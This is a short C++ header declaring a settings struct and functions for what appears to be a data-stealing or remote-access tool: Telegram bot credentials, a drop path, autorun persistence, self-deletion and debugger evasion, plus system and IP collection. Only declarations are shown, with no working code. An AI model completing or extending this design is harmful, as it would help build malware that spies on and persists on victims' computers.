#pragma once
#ifndef MANAGER_H
#define MANAGER_H
#include "common.h"

#pragma pack(push, 1)
struct Settings {
	char botapi[128] = { 0 };
	char chatid[128] = { 0 };
	char drop[128] = { 0 };
	char autorun[128] = { 0 };
	char client_delay[128] = { 0 };
	bool auto_delete;
	bool autorun_state;
	bool drop_run;
	bool protect_debuggers;
};
#pragma pack(pop)

std::string GetOS();
std::string GetPCName();
std::string GetIP();
std::string ProcessList();
long GetFileSize(const char* filename);
void ReadData(Settings* s);
void Autorun(const char* name);
void Protector();
std::string ToLower(std::string str);
std::vector<std::string> split(std::string str, char delim);
bool FileExists(std::string name);

#endif